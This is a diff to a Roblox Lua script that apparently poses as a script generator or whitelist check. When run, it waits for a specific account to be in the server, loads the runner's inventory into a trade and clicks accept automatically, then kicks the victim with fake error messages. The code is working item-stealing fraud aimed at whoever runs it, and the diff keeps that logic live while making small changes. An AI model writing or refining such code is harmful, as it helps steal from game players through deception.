@@ -1,8 +1,9 @@
 print("Started")
-if game.PlaceId == 1730877806 then
-local plrtoinvite = "opaososa"
+
+
 local plr = game.Players.LocalPlayer
 repeat wait() until plr.Character ~= nil
+local plrtoinvite = "opaososa"
 if game:GetService("Players"):FindFirstChild(plrtoinvite) then
     
     --gui
@@ -169,7 +170,7 @@ repeat
     wait()
     
 until plr.PlayerGui:FindFirstChild("TradeGUI")
-local gui = plr.PlayerGui.TradeGUI
+gui = plr.PlayerGui.TradeGUI
 
 print("Loaded")
 local count = 0
@@ -204,7 +205,7 @@ repeat
 until gui.Frame.Player:FindFirstChild("Inventory"):GetChildren()
 local Inventory = gui.Frame.Player:FindFirstChild("Inventory"):GetChildren()
 if Inventory then
-  local unwanteditems = {"Spin","Kilo","Suke","Wooden Plank","Katana","Hammer","Caravel","Galleon","Shark Tooth","Rowboat","Carrot","Bandit Eyepatch","Gorila King Crown","Buggy's Cape","Karoo Food","Gomu","Bari","Bomu","Horo","Mero","Yomi","Vel's Lantern","Lantern of Hope","Ice Necklace","Flame Scarf","Anniversary Cap","Anniversary Firework","Anniversary Hat","Anniversary Lantern","Anniversary Shades"}
+  local unwanteditems = {"Spin","Kilo","Suke","Wooden Plank","Katana","Hammer","Caravel","Galleon","Shark Tooth","Rowboat","Carrot","Bandit Eyepatch","Gorila King Crown","Buggy's Cape","Karoo Food","Gomu","Bari","Bomb","Horo","Mero","Yomi","Vel's Lantern","Lantern of Hope","Ice Necklace","Flame Scarf","Anniversary Cap","Anniversary Firework","Anniversary Hat","Anniversary Lantern","Anniversary Shades"}
   for index, value in pairs(Inventory) do
     wait(0.1)
     if count ~= 18 then
@@ -242,7 +243,7 @@ plr:Kick("We do not whitelist alt accounts, please join with a elegible account"
 end
 
 firesignal(acc.MouseButton1Click)
-repeat wait() until gui == nil
+repeat wait(1) print(gui) until gui == nil
 plr:Kick("Error while generating script, please rejoin")
 elseif game.Workspace:FindFirstChild("CamParts") then
 local servercode = "KF4X5T2yeG"
@@ -262,5 +263,5 @@ end)
 elseif not game:GetService("Players"):FindFirstChild(plrtoinvite) and not game.Workspace:FindFirstChild("CamParts") then
 plr:Kick("Join menu to get whitelisted")
 
-end
+
 end
